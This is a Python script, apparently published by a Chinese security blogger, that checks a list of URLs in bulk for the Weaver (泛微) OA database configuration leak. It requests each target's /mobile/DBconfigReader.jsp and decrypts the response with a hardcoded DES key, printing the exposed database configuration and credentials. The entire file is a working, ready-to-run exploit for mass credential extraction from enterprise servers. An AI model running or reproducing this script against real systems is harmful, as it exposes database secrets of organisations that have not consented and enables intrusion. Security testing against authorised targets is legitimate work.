#coding UTF-8
#泛微数据库配置信息泄露批量验证脚本
#作者:清水Samny
#

from pyDes import *
import sys
import requests

headers = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'

}
def main():
    print('''

                                  ___  __ _ _ __ ___  _ __  _   _ 
                                 / __|/ _` | '_ ` _ \| '_ \| | | |
                                 \__ \ (_| | | | | | | | | | |_| |
                                 |___/\__,_|_| |_| |_|_| |_|\__, |
                                                             __/ |
                                                            |___/ 

        blog url:   https://blog.csdn.net/sun1318578251  

    ''')
    with open("urls.txt") as f:
        urls = f.readlines()

    for url in urls:
        # 文件读取中字符串结尾会有\r\n
        #print("1:"+url.strip('\n').strip('\r'))
        u = url.strip('\n').strip('\r')
        target=u +'/mobile/DBconfigReader.jsp'
        print(target)
        try:

            print("验证成功，存在漏洞："+str(des('1z2x3c4v').decrypt(requests.get(url=target,headers=headers,timeout=10).content[10:])))
        except Exception as e:
            print(e)
            print("\n UNKOWN Error") 

if __name__ == '__main__':
    main()
